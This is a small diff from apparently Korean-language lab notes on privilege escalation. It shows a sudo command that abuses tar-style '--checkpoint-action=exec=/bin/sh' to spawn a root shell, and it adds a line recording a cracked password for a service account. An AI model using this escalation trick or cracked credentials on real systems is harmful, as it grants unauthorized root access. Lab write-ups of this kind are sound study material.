@@ -28,4 +28,5 @@ sudo /usr/local/sbin/log-collect.sh --checkpoint=1 \
 --checkpoint-action=exec=/bin/sh /tmp/x
 -> checkpoint마다 /bin/sh를 실행하는데 sudo라서 root 권한 sh 실행가능
 
+/opt/lab/crack_demo.py -> svc-backup의 비밀번호: sunshine1
 
